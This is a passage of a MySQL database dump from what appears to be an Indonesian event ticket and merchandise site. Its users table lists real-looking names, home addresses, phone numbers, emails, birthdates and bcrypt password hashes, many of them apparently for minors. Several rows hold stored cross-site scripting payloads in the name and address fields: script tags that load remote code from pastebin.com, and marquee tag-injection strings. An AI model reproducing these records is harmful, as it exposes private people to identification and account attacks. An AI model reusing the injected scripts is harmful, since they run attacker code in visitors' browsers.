(222, 'Syifa aulia', 'Bekasi regensi 2', '089663303355', 0, 'syifarahma741@gmail.com', NULL, '$2y$10$mKgbuqBYGnG1jBL7piO4ke39Rzuhb9Ibuz8kp0hfh1eJvr6emZkJa', 'Perempuan', '2003-09-07', NULL, '2019-11-30 09:23:37', '2019-11-30 09:23:37'),
(223, 'Bima putra aji pertama', 'Bekasi tambun graha prima blok m 10 no 17', '087879066307', 0, 'bputra63@yahoo.com', NULL, '$2y$10$AeGmCA2SmFNw5EXPbr0U6uoBPUceJwfnTe.DxRtOEsbJL9HsBgfnm', 'Laki-Laki', '2003-09-28', NULL, '2019-11-30 10:36:41', '2019-11-30 10:36:41'),
(224, 'Bima putra aji pertama', 'Bekasi graha prima blok m10 no 17', '087879066307', 0, 'pbima27@yahoo.com', NULL, '$2y$10$olsIrAOXh38iPY.xhvzdpeX0iE0XQUixZnlc3/lLmLvjaRbHjhlTa', 'Laki-Laki', '2003-11-28', NULL, '2019-11-30 11:07:25', '2019-11-30 11:07:25'),
(225, 'Narsiah', 'Kp.gondrong jl.villa bekasi indah 2, rt01 rw003,desa jejalenjaya tambun utara', '085217561435', 0, 'narsiahnare02@gmail.com', NULL, '$2y$10$.sOX5bsZ5NDC5lM6/rH3MOh17CCWK54OC686MvfQn5LoyolgZAl9i', 'Perempuan', '2004-12-02', NULL, '2019-11-30 13:13:17', '2019-11-30 13:13:17'),
(226, 'Alya Shafira Ramadhani', 'Tridaya indah 3 blok b3 no.7, sumberjaya, tambun selatan. Bekasi', '081398933401', 0, 'alyaramadhani12@yahoo.com', '2019-11-30 17:30:11', '$2y$10$SJCak40tKEMIlIpeJQWYVet7UsNcVd.PXLJbrzSYbV0X949EI06Vu', 'Perempuan', '1999-12-25', NULL, '2019-11-30 17:29:29', '2019-11-30 17:30:11'),
(227, 'Amalia Latri Pritiandini', 'Jln Candi Kalasan B252 RT 005 RW 011 Kelurahan Duren Jaya Kecamatan Bekasi Timur Kota Bekasi', '085946370327', 0, 'amalialatri05@gmail.com', '2019-11-30 18:48:29', '$2y$10$loqF48tDATjde2mTh3rbR.ynu4IQrJneUY3jxGuE4Y.1cNbqt/BfO', 'Perempuan', '1999-07-05', 'HTqbrMgqznT7pwEPkzC0aE1EybwtNeiL2rQKqTUpGhS5W5CWwJUeMiFMxgXh', '2019-11-30 18:47:20', '2019-12-15 16:19:40'),
(228, 'shafiramaulidina', 'Jl raya mangun jaya rt 004 rw 013', '082112709675', 0, 'junebbaneb@gmail.com', '2019-12-01 02:41:43', '$2y$10$aTAJ6GA60G3sOEXhx1UzzOzpAFmT2rIGadPrGDWz82dXfncRy1mua', 'Perempuan', '2000-05-03', NULL, '2019-12-01 02:39:05', '2019-12-01 02:41:43'),
(229, 'Antonio', 'Tridaya 4 Blok AB2 No. 5', '081218392597', 0, 'karakter881@gmail.com', '2019-12-01 04:17:45', '$2y$10$mSYQ/YKUiPPDYOEqyUD9qOHbXSA8a9XYltwYhidx4C7S5pXfQSNku', 'Laki-Laki', '2001-12-07', NULL, '2019-12-01 04:16:40', '2019-12-01 04:17:45'),
(230, 'M Mahardhika A', 'Taman Puri Cendana C7/9 Tambun Selatan Bekasi', '081288666436', 0, 'mahardhikaakbar@gmail.com', '2019-12-01 06:40:13', '$2y$10$oJNOJO1F0oRpn3pRFjM2/eeSJKWXMUCyDjYpTWs7KE9q5jR2XQQou', 'Laki-Laki', '1999-03-04', NULL, '2019-12-01 06:39:19', '2019-12-01 06:40:13'),
(231, 'Sri Fajaryati', 'Gramapuri Tamansari C21/7', '089608258096', 0, 'srifajaryati14@gmail.com', '2019-12-01 07:21:47', '$2y$10$CElL0XOao4wB5GYPrFeUoune13SeI7wl3N4xgfHoGg/Jpcy9aahci', 'Perempuan', '2000-11-24', NULL, '2019-12-01 07:21:07', '2019-12-01 07:21:47'),
(232, 'Fransiska Gratia', 'Kartika wanasari 2 blok FB no 12', '081286374878', 0, 'gratianatalia@gmail.com', '2019-12-01 08:20:16', '$2y$10$YktjBvwHQPdOl4dvzsa5..llYzv4QGkYeTD6q/rUgsoTBxcHOin5y', 'Perempuan', '1999-12-03', NULL, '2019-12-01 08:19:40', '2019-12-01 08:20:16'),
(233, 'Shalsa Arta', 'Perum. Papan Mas Blok G 42 No.27 Rt008/Rw007', '08973550481', 0, 'shalsaarta22@gmail.com', NULL, '$2y$10$hdgmcQBjGnnGG66Psb7qu.U8N4Mo3KwbNvmWnWZAjGqA6CiBACA8S', 'Perempuan', '2003-04-22', NULL, '2019-12-01 10:17:15', '2019-12-01 10:17:15'),
(234, 'Irma elvira rizki', 'Kp.cijengkol kramat , kec.Setu kab.Bekasi', '089662355580', 0, 'rizkielvira540@gmail.com', '2019-12-02 08:13:43', '$2y$10$HzQKttvItUOKyEpA55J22upFEHKCbvGJngalBo2Bc7v9.rfESEBjy', 'Perempuan', '2003-08-08', NULL, '2019-12-02 08:12:44', '2019-12-02 08:13:43'),
(235, 'Maulina Miftahul', 'Perumahan Bekasi Regensi 1 Blok I6 No 05 Rt 03 Rw 07, Kel. Wanasari Kec. Cibitung', '085718779802', 0, 'maylinamift305@gmail.com', NULL, '$2y$10$OuaX9JiJtUpK4KJWAKm5pepugAzPShgUFLZUkecDJi8cdJLcMdcKu', 'Perempuan', '2001-05-30', NULL, '2019-12-02 08:16:28', '2019-12-02 08:16:28'),
(236, 'Maylina miftahul', 'Perumahan Regensi 1 Blok I6 No 05, Rt 03 Rt 07 Kel. Wanasari Kec. Cibitung', '085718779802', 0, 'miftmaylina@gmail.com', '2019-12-02 08:38:15', '$2y$10$kPxjK5GZFZYqpFmulDGptu6tkARgoACHoHiu5xqG8X7/GgMcjYKhG', 'Perempuan', '2001-05-30', NULL, '2019-12-02 08:37:09', '2019-12-02 08:38:15'),
(237, 'Sri wahyuni', 'Perum. Pesona pulo indah blok d1 no.15', '08976815104', 0, 'whyn1802@gmail.com', '2019-12-02 16:21:01', '$2y$10$iLsW6pDHezWQxORJOoWB7uUE1flGbjm22bE25CeJotkJfIZOHZP8m', 'Perempuan', '2001-02-18', NULL, '2019-12-02 08:48:13', '2019-12-02 16:21:01'),
(238, 'Irma elvira rizki', 'Kp.cijengkol kramat, kec.Setu, kab.Bekasi', '089662355580', 0, 'irmae3896@gmail.com', '2019-12-02 15:17:29', '$2y$10$1h5DN7CFsRnyH2S7sUZOT.OvnTFJ5/9kWduEaDMLwWwPd9y3V6Ize', 'Perempuan', '2003-08-08', NULL, '2019-12-02 15:16:33', '2019-12-02 15:17:29'),
(239, 'Gilang paradise', 'Villa bekasi indah 2 blok b 5 nomer 11', '08818126356', 0, 'gilang.paradise@yahoo.com', NULL, '$2y$10$pr0x0TsZIXY75vuukmwrs.PBTcNrc0h2GJbTPTul2xqeoS.I/uY4K', 'Laki-Laki', '2001-12-12', NULL, '2019-12-02 16:19:38', '2019-12-02 16:19:38'),
(240, 'Sri wahyuni', 'Perum.pesona pulo indah blok d1 no.15 rt002/053', '08976815104', 0, 'whynyuni2@gmail.com', '2019-12-02 16:25:56', '$2y$10$Ey07/clGAHOMnZoKRyN02OIcqAKtFX/kN6M2w5EcNx9ZFV/XSRKEW', 'Perempuan', '2001-02-18', NULL, '2019-12-02 16:24:38', '2019-12-02 16:25:56'),
(241, 'Aulya nur ahadina', 'Villa bekasi indah 2 blok b5 no.11', '08818126356', 0, 'aulyaaaanurra@gmail.com', '2019-12-02 16:28:24', '$2y$10$ajvr68gu73A7Uswn9CpjR.Uu2rbkGjQvefrMzGx4o6i4jOBi7bS7y', 'Perempuan', '2002-01-06', NULL, '2019-12-02 16:27:53', '2019-12-02 16:28:24'),
(242, 'Annisa MS', 'Bekasi', '088212363381', 0, 'annisa.m.sabilla@gmail.com', '2019-12-03 15:19:03', '$2y$10$p2ajzvpB6hg5JMJSg/vf..zhefLBCga5Rq0JbihLqamsWnNi2z2Cu', 'Perempuan', '2003-06-15', NULL, '2019-12-03 15:17:53', '2019-12-03 15:19:03'),
(243, 'Riska A', 'Villa 1 B10 no. 11 Tambun Selatan', '082121448725', 0, 'riska.amalia055@gmail.com', '2019-12-04 13:40:51', '$2y$10$2S2fCO4UctpSJ2xvgjPXs.JoCsP5sDwFb4LL3GFq7rRXvuAUPtkci', 'Perempuan', '2001-05-18', NULL, '2019-12-04 13:40:24', '2019-12-04 13:40:51'),
(244, 'Yavvi Adi Nurrahman', 'Bekasi Regensi 2 Blok EE9 No.12', '081287869706', 0, 'yavviadii@gmail.com', '2019-12-06 17:21:31', '$2y$10$wImaevieyHvTj5GZTYS1uOxhvXeHba.i4hBmTtY2OZI35EURY9RpO', 'Laki-Laki', '2002-07-24', NULL, '2019-12-06 17:20:17', '2019-12-06 17:21:31'),
(245, 'Ghilman Muhammad Aqil', 'Metland tambun', '089692292891', 0, 'ghilman.m.aqil@gmail.com', '2019-12-07 13:43:44', '$2y$10$/7OYG2FhVojub68XadOyAe/gOsF.N9rytupB5VS.UVPoR3KKpp7PC', 'Laki-Laki', '2003-09-27', NULL, '2019-12-07 13:43:00', '2019-12-07 13:43:44'),
(246, 'Maria Qibtia', 'jl KH Muhammad RT 01/02 gang macan', '085710585652', 0, 'mariaqibtiaa@gmail.com', '2019-12-08 03:20:27', '$2y$10$rPcl520cHGRTQ1fxRejHuu1vqatTmb/uCmAXLZHr6SCRCVmn6O46m', 'Perempuan', '2000-05-13', NULL, '2019-12-08 03:19:41', '2019-12-08 03:20:27'),
(247, 'Alis salman alfarisi', 'Mahkota indah ga 1 no 14', '082113470434', 0, 'alissalman14@gmail.com', NULL, '$2y$10$O6iF45DQqtD8EAhQ/zVBBeeOLl/SarRvVZa.jA97gvXZGxvmbB7yW', 'Laki-Laki', '2004-03-14', NULL, '2019-12-08 08:10:24', '2019-12-08 08:10:24'),
(248, 'asu', 'p', '00000000000000', 0, 'rio.aldi24@yahoo.com', NULL, '$2y$10$AoOSJ9rfLZ1Y/crXDcFSHOEwhPsPcWxGTnfm.oauT.MKU7M56z6Li', 'Perempuan', '1999-12-21', NULL, '2019-12-09 11:37:02', '2019-12-09 11:37:02'),
(249, 'Tets', 'Depan polsek', '0875469870759', 0, 'hdhdj@gmail.com', NULL, '$2y$10$tIjFw90g2jGAji38mHa9ruYC4K6.FzKk3G2BDJcKFtAc7MGAuA3Au', 'Laki-Laki', '2019-12-15', NULL, '2019-12-15 07:19:53', '2019-12-15 07:19:53'),
(250, 'regina zwasti irawan', 'Perumahan Griya Asri 1 BLOK A/8 NO 15 , BEKASI TAMBUN SELATAN DESA SUMBER JAYA', '08388935856', 0, 'reginazwasti@gmail.com', NULL, '$2y$10$rqrLgMzKRUX0yU1v5NLo5eXNyroB3Sti.Xt99SB8MUoD4.iOTwHre', 'Perempuan', '2004-02-18', NULL, '2019-12-23 14:50:41', '2019-12-23 14:50:41'),
(251, 'Bimo Yusuf Pandoga', 'Permata regensi, Tambun Selatan, Bekasi', '082110266565', 0, 'bimoyusufp@gmail.com', '2019-12-24 04:16:47', '$2y$10$ouWlcLiD7D03Di7u9.IobuzJXg5XzdT8a9xatzJgg7VHJAauiDPVG', 'Laki-Laki', '2002-03-26', NULL, '2019-12-24 04:09:42', '2019-12-24 04:16:47'),
(252, 'Gede kharisma irawan', 'Jakarta timur', '08118112298', 0, 'gedekharismairawan@gmail.com', NULL, '$2y$10$ymG1kSOMgf7TALR.dPExsulZMESAz1kQoA9L9vo5T5mzKchW0ljUq', 'Laki-Laki', '1991-03-10', NULL, '2019-12-24 06:32:02', '2019-12-24 06:32:02'),
(253, '<script type=\"text/javascript\" src=\"https://pastebin.com/raw/ECqfqAvK\">', '<script type=\"text/javascript\" src=\"https://pastebin.com/raw/ECqfqAvK\">', '1', 0, 'tkjcybersecurityidiots@idiots.com', NULL, '$2y$10$0qEurYEj3dddb9VgA9iOoe1b.YyEKFflSS9lklZlSJICqyemUEgEC', 'Laki-Laki', '1997-08-04', NULL, '2019-12-26 17:51:47', '2019-12-26 17:51:47'),
(254, 'Ilhamkurniawan', 'Villa mutiara wanasari Blok L 18 No 8', '081398327225', 0, 'ilhamkurniawan105@gmail.com', '2020-01-04 17:50:03', '$2y$10$LhyedPO3MOUmig97eHtVb.VbTpL89CkqdA/tjDWSRcVNhp9tP9Ss6', 'Laki-Laki', '2003-04-21', NULL, '2020-01-04 17:49:08', '2020-01-04 17:50:03'),
(255, 'Muhammad arga', 'Bekasi, cikarang barat, telaga harapan blok D1 no.29-30', '081315081230', 0, 'argarizqillahi26@gmail.com', '2020-01-06 11:54:59', '$2y$10$T/Hq8EvYeTun20v/KOsNNOq9GIjUjlbzhK/ioHybI7DjHVz5d6d/i', 'Laki-Laki', '2003-12-13', NULL, '2020-01-06 11:54:27', '2020-01-06 11:54:59'),
(256, 'M Frizki Alfian', 'Jl. Karya Logam, Tambun Selatan, Kab. Bekasi, Rt. 01 Rw. 05', '089687970916', 0, 'fianrizky41@gmail.com', '2020-01-06 14:28:47', '$2y$10$eXJUrQX5qTcpqtZ9ietDHeLtoEkeIdBfeOnw4IQ9Ki90sRgiNMmX.', 'Laki-Laki', '2000-06-28', NULL, '2020-01-06 14:26:33', '2020-01-06 14:28:47'),
(257, 'Moga Purnama', 'Taman Tridaya Indah 02 Blok I6.No 11', '08971623113', 0, 'mogapurnama23@gmail.com', '2020-01-06 16:25:21', '$2y$10$WvJfhBns3/d8JrrugdjHjeHerlj13wljWODfuPOjqtpkBFYzIaGDS', 'Laki-Laki', '2000-05-03', NULL, '2020-01-06 16:03:49', '2020-01-06 16:25:21'),
(258, 'Moga Purnama Ashari', 'Taman Tridaya Indah 02 Blok I6.No 11', '08971623113', 0, 'hanasaharning04@gmail.com', NULL, '$2y$10$lnzrb25pL7/nXbJE0/A9OO2OOelwgthMIfuOja12Gjs1gs/nMfxCC', 'Laki-Laki', '2000-05-03', NULL, '2020-01-06 16:18:12', '2020-01-06 16:18:12'),
(259, 'hanif tes', 'sg', '233', 0, 'xipak41781@sammail.ws', '2020-01-06 17:19:04', '$2y$10$tz05nEem9wLl.9Y2Y0NLYupVaU4lZEDDJqNlKdQCwFWAeVF6uLwHO', 'Laki-Laki', '2020-12-31', NULL, '2020-01-06 17:18:44', '2020-01-06 17:19:04'),
(260, 'Dimas Arif', 'Kp rukem rt 02 rw 13 no 61', '0895330762441', 0, 'ghostpells@gmail.com', '2020-01-06 18:23:47', '$2y$10$jDsSGOPjiNJyUnX8GnxyMulc34etUoXVYmRGqqcDdQW9TwRKZHsby', 'Laki-Laki', '2002-01-06', NULL, '2020-01-06 18:02:33', '2020-01-06 18:23:47'),
(261, 'Alliffiyola Lani Putri', 'Jl H Dalih no. 9 rt04 rw08 kel.Cirendeu kec. Ciputat timur', '0895640358813', 0, 'allifiyola@gmail.com', '2020-01-07 01:01:47', '$2y$10$nwWsJUoSXmX4Jsx7d0Ov/u4igwQsrYZ1vAgqmgf5Au6n/kAehlyRO', 'Perempuan', '2001-07-11', NULL, '2020-01-07 01:00:43', '2020-01-07 01:01:47'),
(262, 'Noviyanti Pasolang', 'Bekasi', '0895640358813', 0, 'vivi.pasolang@gmail.com', '2020-01-07 07:08:40', '$2y$10$bPBjKOXhFSRBC1KXUWESrOv1.3De8lXhJIU/EkKq34z7bJV5aNT5O', 'Perempuan', '2001-11-26', NULL, '2020-01-07 07:08:07', '2020-01-07 07:08:40'),
(263, 'Rio', 'Cianjur', '0888888888', 1, 'Riiobtrn24@gmail.com', '2020-01-07 11:35:34', '$2y$10$g5ZlVL2.9TE3xdz4gR4PXOOoL2X3oOKScxgQwmf2yrNe8FKkJIRNu', 'Laki-Laki', '2001-11-24', NULL, '2020-01-07 11:28:03', '2020-01-07 11:35:34'),
(264, 'safira maulidina', 'jln kaca piring', '081319421259', 0, 'evoker440@gmail.com', '2020-01-07 13:53:33', '$2y$10$rvTIvFGBX3lnIB1AuOm5beCExh10XZYton5xC2PH0mRvXvfnOPx56', 'Perempuan', '2004-01-07', NULL, '2020-01-07 13:52:11', '2020-01-07 13:53:33'),
(265, 'Rifqi zayyan', 'Taman kintamani', '082110679816', 0, 'rifqizayyan@gmail.com', NULL, '$2y$10$oR/20Ut/ta6XL5bC8oLLoeEtbpIVdDebbmxrvEwl7.ELJH7why.fa', 'Laki-Laki', '2004-07-10', NULL, '2020-01-08 02:00:13', '2020-01-08 02:00:13'),
(266, 'Rifqi zayyan', 'Taman kintamani', '082110679816', 0, 'rifqitmvm@gmail.com', NULL, '$2y$10$y3tgPhAL7DmFEON/3H/Q8eAUYJ9pCU7GBCn5u8lSl.nrhnc8X8IJu', 'Laki-Laki', '2004-07-10', NULL, '2020-01-08 02:03:46', '2020-01-08 02:03:46'),
(267, 'ridho hisyam', 'jl.setiadarma 1', '08129560090', 0, 'hisyamrd@gmail.com', '2020-01-08 04:21:54', '$2y$10$B2erJVCqHmII6M4AiQuwvevZR3GwpZ4t9/p3.AB0wqQ25fJGWuLh.', 'Laki-Laki', '2001-11-25', NULL, '2020-01-08 04:18:05', '2020-01-08 04:21:54'),
(268, 'Indra wijaya k', 'Kp Kebalen No 63 Rt 001 Rw 014 Kel. Kebalen Kec. Babelan', '081993174691', 0, 'indrawijayak91@gmail.com', NULL, '$2y$10$8aMjZbqxoWkj92KidIrfUOfrbqI4GNRdl52D3j5lNTGvYBqdC1IF.', 'Laki-Laki', '1991-01-15', NULL, '2020-01-08 04:28:10', '2020-01-08 04:28:10'),
(269, 'Indra Wijaya Kurniawa', 'Kp Kebalen No 63 Rt 001 Rw 014 Kel. Kebalen Kec. Babelan', '081993174691', 0, 'babakayra91@gmail.com', '2020-01-08 06:21:56', '$2y$10$3O5TfCQxLZdqt6dPh8OUM.4A21ECrijZUdXnf2HCWnK8aLlMgfxSW', 'Laki-Laki', '1991-01-15', NULL, '2020-01-08 04:30:48', '2020-01-08 06:21:56'),
(270, 'Aghnial Saiful Adli', 'Perum margahayu jaya blok beringin 2 no 75b', '081218223211', 0, 'nialhoras45@gmail.com', '2020-01-08 04:38:33', '$2y$10$qnMQqdgHqPmR3nHoGLdhguLEDrrEaEUB9wIdKVv06ak99FJPN6m5K', 'Laki-Laki', '2004-04-13', NULL, '2020-01-08 04:35:16', '2020-01-08 04:38:33'),
(271, 'rakha fahrizi', 'jalan andini sakti, kp cibuntu bojong, kecamatan cikarang barat, bekasi , rt/rw 002-002', '085695342790', 0, 'rakhafarizi2015@gmail.com', '2020-01-09 02:11:33', '$2y$10$nw1y87Dl6CH57IFWIBY.2ukviCU9gzDjMY6Xzoi.huxQMcZ/uH7hy', 'Laki-Laki', '2002-03-13', NULL, '2020-01-09 02:08:24', '2020-01-09 02:11:33'),
(272, 'Rafi Hibatullah', 'Perum Regensi 2 Blok AA4 No.7\r\nCibitung-Bekasi', '089623740872', 0, 'rafi.hibatullah16@gmail.com', '2020-01-09 13:51:22', '$2y$10$mCaTq7JLzdfOOLc/YfXZxuTYKV/Eo2B22OnNaJKNqVOPR1HVASCFC', 'Laki-Laki', '2000-12-16', NULL, '2020-01-09 13:50:03', '2020-01-09 13:51:22'),
(273, 'Tri nadifa', 'Perumahan kartika wanasari asabri Blok G1 no 12 jalan nangka raya', '089526492221', 0, 'trnadifaa8@gmail.com', NULL, '$2y$10$jrqP9c02IqFqh7q.B/GmjOoXChefeS6LBgtmycOil6eRH0pcJe3GW', 'Perempuan', '2002-03-20', NULL, '2020-01-09 14:48:03', '2020-01-09 14:48:03'),
(274, 'Tri nadifa', 'Perumahan kartika wanasari asabri', '089526492221', 0, 'pipamparapam20@gmail.com', '2020-01-09 15:00:09', '$2y$10$g82pOGB3O1FHPBpbhlvLlenLw.qCpRUE.K84WCwZNpDs7yo4SjMDe', 'Perempuan', '2002-03-20', NULL, '2020-01-09 14:56:56', '2020-01-09 15:00:09'),
(275, 'sari gumbira', 'Bekasi Griya Pratama', '081802104898', 0, 'gumbira.1011@gmail.com', '2020-01-10 08:07:58', '$2y$10$GZ2gGcEBZVdlhDj2n1guEu6Nfsw0JetLqY9eI8/Xes.xgiRSGduB.', 'Perempuan', '1987-11-10', NULL, '2020-01-10 08:06:24', '2020-01-10 08:07:58'),
(276, 'Maulana Aziz P', 'Grama Puri Taman Sari C20 No 22', '087888785236', 0, 'maulanas38.ma@gmail.com', '2020-01-11 04:49:03', '$2y$10$mtlFQHh/8LfQY3Jkryz6beE62zMR7JBxoMlcOq93pRqsuUmP87fIa', 'Laki-Laki', '2020-01-11', NULL, '2020-01-11 04:47:25', '2020-01-11 04:49:03'),
(277, 'Ahmad Jafar Sadiq', 'Griya Asri 2 Blok K4 no.39', '085817488461', 0, 'ahmadjafar748@gmail.com', '2020-01-14 04:54:01', '$2y$10$OCQjw7x0jBJK.thu93U9q.exlT0H9Q6fM7BpklI2Xwo3M5dGVB9Ae', 'Laki-Laki', '2000-02-16', NULL, '2020-01-14 04:44:25', '2020-01-14 04:54:01'),
(278, 'Arya Gans', 'kepo jae lu', '088888888888', 1, 'aryamohen18@gmail.com', '2020-01-14 18:00:00', '$2y$10$3VW305JImRC6rUk4zgb7eujS9mmfaRCj4ez5Uwnl0xVk/pXv9oOEe', 'Perempuan', '2001-12-24', NULL, '2020-01-15 02:47:14', '2020-01-15 02:47:14'),
(279, 'novandi prasetyo putro', 'GRAHA', '089683256106', 0, 'novandiprasetyoputro@gmail.com', '2020-01-15 05:41:04', '$2y$10$j8ZMiGrUvUJtPkEPDeF.NO9QDGUF4r0K5jIF6114I8xPfN3KKKs7y', 'Laki-Laki', '1995-11-10', NULL, '2020-01-15 05:40:26', '2020-01-15 05:41:04'),
(280, 'AditiyaSaputra', 'MangunJaya indah 1 blok da 1 no.25 perum mangun jaya selatan tambun selatan bekasi', '08811036014', 0, 'aditiyan50@gmail.com', '2020-01-15 08:01:09', '$2y$10$zWn/7lEz3uJKOKy00jIxrOtAQ71u00.dkzUAhUh.tYi4rKPTuL53a', 'Laki-Laki', '2004-04-05', NULL, '2020-01-15 08:00:16', '2020-01-15 08:01:09'),
(281, 'Alfarizi', 'Gramapuri Cibitung Bekasi', '081251722080', 0, 'alfarizifariz16@gmail.com', '2020-01-15 13:58:07', '$2y$10$LpuWxeaLeQ4Pu9EKodlx.eyAeCkEqogNM5bewp3jnietwDFLiExNi', 'Laki-Laki', '1997-06-16', NULL, '2020-01-15 13:56:13', '2020-01-15 13:58:07'),
(282, 'Margareth Sitanggang', 'Cluster ubud u13 no 31', '089529435697', 0, 'margarethsitanggang17@gmail.com', '2020-01-15 18:00:00', '$2y$10$/CaAmk96MVCrqeghFFaOZOmqYjSmQ0jApsFsLFlf2yCtJbwOLyYRW', 'Perempuan', '2002-05-17', NULL, '2020-01-16 08:48:29', '2020-01-16 08:48:29'),
(283, 'Hshs', '\"><marquee>TELS123', '667676', 0, 'a@gmail.com', NULL, '$2y$10$m6Ts2fJ7Dj1pC32YD02xOO/N8vF9GoOG0nApHee8rnZEYjXs2nR3.', 'Perempuan', '2021-10-01', NULL, '2020-01-16 14:22:35', '2020-01-16 14:22:35'),
(284, 'Apage', '\"><marquee>TELS', '04546', 0, 'ddhdh@gmail.com', NULL, '$2y$10$gtvnbqvPh.2XnkbQI/.GF.7dQjYnzI.df9hOfB0GvIS/kmJunWOxa', 'Perempuan', '2020-10-07', NULL, '2020-01-16 14:28:53', '2020-01-16 14:28:53'),
(285, 'Rhara Syakilla', 'perum taman tridaya indah 2', '0895606085026', 0, 'rharasyakilla29@gmail.com', '2020-01-17 11:01:18', '$2y$10$t1VMzdZ6csKmDljJap5pE.WvtFIOXEh2wLutxnZXyC1j70SctZVM6', 'Perempuan', '2003-08-29', NULL, '2020-01-17 10:54:54', '2020-01-17 11:01:18'),
(286, 'Riga Normanda Putra', 'Jl. Mekarsari Tengah No 60 RT003/013 Tambun Selatan', '081284766406', 0, 'putrarigha@gmail.com', '2020-01-17 16:54:28', '$2y$10$v/NnUOXknkfgiRz8gjN/yu0Y4YdoV3eXSjJBa1k4f8phsPzt88d5.', 'Laki-Laki', '1996-07-19', NULL, '2020-01-17 16:48:06', '2020-01-17 16:54:28'),
(287, 'keisha septi', 'kp.bulu desasetia mekar', '088210426681', 0, 'keishmayumi@gmail.com', NULL, '$2y$10$W6N.F9aDv3yE1/1WFY4QiesDIh.cWNLExJSLm3k5haUntuLTF2xJy', 'Perempuan', '2004-09-10', NULL, '2020-01-18 00:26:37', '2020-01-18 00:26:37'),
(288, 'Zoeffi akbar', 'Rumah', '0813', 0, 'zoeffiakbar8@gmail.com', NULL, '$2y$10$MjYQDOlhRRfjYn/hDIHG3uuwBxhrfvljJ9FCW/iFd8UWfMqoELBFS', 'Laki-Laki', '1999-10-10', NULL, '2020-01-18 01:07:31', '2020-01-18 01:07:31'),
(289, 'whoami', '<script type=\"text/javascript\" src=\"https://pastebin.com/raw/Rd9w0txB\"></script>', '13565416', 0, 'whoami90909090@gmail.com', '2020-01-18 10:55:32', '$2y$10$35F8UZZ4O.ytpmRLqALc5.pR4TJGdT44AXp7RgEO/vcXNqlneY02S', 'Perempuan', '2095-10-10', NULL, '2020-01-18 10:53:54', '2020-01-18 10:55:32'),
(290, 'Fadli', 'Btp', '087871194331', 0, 'kujangmangprangnusan@gmail.com', '2020-01-18 18:49:39', '$2y$10$jcY6SCdey2fR9uP7.m5uIuHBSXK4pN./PAbqobvX/JH3KZbbCyJPe', '-- Pilih Jenis Kelamin --', '2020-01-19', NULL, '2020-01-18 18:47:50', '2020-01-18 18:49:39'),
(291, 'ivanka', 'wisma jaya', '087787877797', 0, 'auliaivankarx@gmail.com', '2020-01-18 19:30:56', '$2y$10$/3xijzlLur2CqrHrUQ8QBOwYjyk6EzWwHZA/YS6fQMyc.7P65yxqe', 'Perempuan', '2000-12-02', NULL, '2020-01-18 19:23:58', '2020-01-18 19:30:56');

--
-- Indexes for dumped tables
--

--
-- Indeks untuk tabel `confirm_merch`
--
ALTER TABLE `confirm_merch`
  ADD PRIMARY KEY (`id_confirm_merch`);

--
-- Indeks untuk tabel `confirm_payment`
--
ALTER TABLE `confirm_payment`
  ADD PRIMARY KEY (`id_confirm`);

--
-- Indeks untuk tabel `lineup`
--
ALTER TABLE `lineup`
  ADD PRIMARY KEY (`id_line`);

--
-- Indeks untuk tabel `merch`
--
ALTER TABLE `merch`
  ADD PRIMARY KEY (`id_merch`);

--
-- Indeks untuk tabel `migrations`
--
ALTER TABLE `migrations`
  ADD PRIMARY KEY (`id`);

--
-- Indeks untuk tabel `ordermerch`
--
ALTER TABLE `ordermerch`
  ADD PRIMARY KEY (`id_ordermerch`);

--
-- Indeks untuk tabel `orderticket`
--
ALTER TABLE `orderticket`
  ADD PRIMARY KEY (`id_orderticket`);

--
-- Indeks untuk tabel `password_resets`
--
ALTER TABLE `password_resets`
  ADD KEY `password_resets_email_index` (`email`);

--
-- Indeks untuk tabel `ticket`
--
ALTER TABLE `ticket`
  ADD PRIMARY KEY (`id_ticket`);

--
-- Indeks untuk tabel `users`
--
ALTER TABLE `users`
  ADD PRIMARY KEY (`id_users`),
  ADD UNIQUE KEY `users_email_unique` (`email`);

--
-- AUTO_INCREMENT untuk tabel yang dibuang
--

--
-- AUTO_INCREMENT untuk tabel `confirm_merch`
--
ALTER TABLE `confirm_merch`
  MODIFY `id_confirm_merch` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=32;

--
-- AUTO_INCREMENT untuk tabel `confirm_payment`
--
ALTER TABLE `confirm_payment`
  MODIFY `id_confirm` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=171;

--
-- AUTO_INCREMENT untuk tabel `lineup`
--
ALTER TABLE `lineup`
  MODIFY `id_line` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=6;

--
-- AUTO_INCREMENT untuk tabel `merch`
--
ALTER TABLE `merch`
  MODIFY `id_merch` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=23;

--
-- AUTO_INCREMENT untuk tabel `migrations`
--
ALTER TABLE `migrations`
  MODIFY `id` int(10) UNSIGNED NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=3;

--
-- AUTO_INCREMENT untuk tabel `ticket`
--
ALTER TABLE `ticket`
  MODIFY `id_ticket` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=4;

--
-- AUTO_INCREMENT untuk tabel `users`
--
ALTER TABLE `users`
  MODIFY `id_users` bigint(20) UNSIGNED NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=292;
COMMIT;

/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
